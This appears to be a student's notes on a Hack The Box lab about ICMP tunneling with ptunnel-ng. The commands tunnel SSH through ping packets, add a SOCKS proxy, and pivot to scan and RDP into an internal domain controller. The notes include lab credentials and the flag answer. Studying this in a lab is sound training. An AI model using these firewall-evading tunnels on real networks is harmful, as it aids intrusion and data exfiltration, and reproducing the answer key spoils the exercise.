# ICMP Tunneling with SOCKS
ICMP tunneling encapsulates your traffic within `ICMP packets` containing `echo requests` and `responses`. ICMP tunneling would only work when ping responses are permitted within a firewalled network. When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. The external server can validate this traffic and send an appropriate response, which is extremely useful for data exfiltration and creating pivot tunnels to an external server.

We will use the [ptunnel-ng](https://github.com/utoni/ptunnel-ng) tool to create a tunnel between our Ubuntu server and our attack host. Once a tunnel is created, we will be able to proxy our traffic through the `ptunnel-ng client`. We can start the `ptunnel-ng server` on the target pivot host. 

## Setting Up & Using ptunnel-ng
### Cloning Ptunnel-ng

```sh
masterofblafu@htb[/htb]$ git clone https://github.com/utoni/ptunnel-ng.git
```

### Building Ptunnel-ng with Autogen.sh

```sh
masterofblafu@htb[/htb/ptunnel-ng]$ sudo ./autogen.sh
```

### Alternative approach of building a static binary

```sh
masterofblafu@htb[/htb/ptunnel-ng]$ sudo apt install automake autoconf -y
masterofblafu@htb[/htb/ptunnel-ng]$ sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
masterofblafu@htb[/htb/ptunnel-ng]$ ./autogen.sh
```

### Transferring Ptunnel-ng to the Pivot Host
If we want to transfer the entire repo and the files contained inside, we will need to use the `-r` option with SCP.

```sh
masterofblafu@htb[/htb]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

### Starting the ptunnel-ng Server on the Target Host

```sh
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22

[sudo] password for ubuntu: 
./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Forwarding incoming ping packets over TCP.
[inf]: Ping proxy is listening in privileged mode.
[inf]: Dropping privileges now.
```

The IP address following `-r` should be the IP of the jump-box we want ptunnel-ng to accept connections on. In this case, whatever IP is reachable from our attack host would be what we would use. 

### Connecting to ptunnel-ng Server from Attack Host
Back on the attack host, we can attempt to connect to the ptunnel-ng server (`-p <ipAddressofTarget>`) but ensure this happens through local port 2222 (`-l2222`). Connecting through local port 2222 allows us to send traffic through the ICMP tunnel.

```sh
masterofblafu@htb[/htb/ptunnel-ng/src]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Relaying packets from incoming TCP streams.
```

### Tunneling an SSH connection through an ICMP Tunnel
With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (`-p2222`).

```sh
masterofblafu@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1

ubuntu@127.0.0.1's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 11 May 2022 03:10:15 PM UTC

  System load:             0.0
  Usage of /:              39.6% of 13.72GB
  Memory usage:            37%
  Swap usage:              0%
  Processes:               183
  Users logged in:         1
  IPv4 address for ens192: 10.129.202.64
  IPv6 address for ens192: dead:beef::250:56ff:feb9:52eb
  IPv4 address for ens224: 172.16.5.129

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

144 updates can be applied immediately.
97 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Wed May 11 14:53:22 2022 from 10.10.14.18
ubuntu@WEB01:~$
```

### Enabling Dynamic Port Forwarding over SSH
We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways.

```sh
masterofblafu@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1

ubuntu@127.0.0.1's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
<snip>
```

### Proxychaining through the ICMP Tunnel
We could use proxychains with Nmap to scan targets on the internal network (172.16.5.x).

```sh
masterofblafu@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-11 11:10 EDT
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
Nmap scan report for 172.16.5.19
Host is up (0.12s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
```

## Questions
SSH to **10.129.7.110** (ACADEMY-PIVOTING-LINUXPIV), with user `ubuntu` and password `HTB_@cademy_stdnt!`
1. Using the concepts taught thus far, connect to the target and establish an ICMP tunnel. Pivot to the DC (172.16.5.19, victor:pass@123) and submit the contents of C:\Users\victor\Downloads\flag.txt as the answer. **Answer: N3Tw0rkTunnelV1sion!**
   - Install and build `ptunnel-ng` static binary (avoid missing libraries when running on the pivot host):
        ```sh
        $ git clone https://github.com/utoni/ptunnel-ng.git
        $ sudo apt install automake autoconf -y
        $ sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
        $ ./autogen.sh
        ```
   - Copy `ptunnel-ng` binary to the pivot host and start the server:
        ```sh
        $ scp -r ptunnel-ng/ ubuntu@10.129.7.155:/home/ubuntu
        # At pivot host
        ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.7.155 -R22
        ```
   - `$ sudo ./ptunnel-ng -p10.129.7.155 -l2222 -r10.129.7.155 -R22` → Connect to the ptunnel-ng server from attack host
   - `$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1` → Enable dynamic port forwarding over SSH to use proxychains
   - `$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123` → Proxychaining through the ICMP tunnel and RDP to the target DC to read the flag at `C:\Users\victor\Downloads\flag.txt`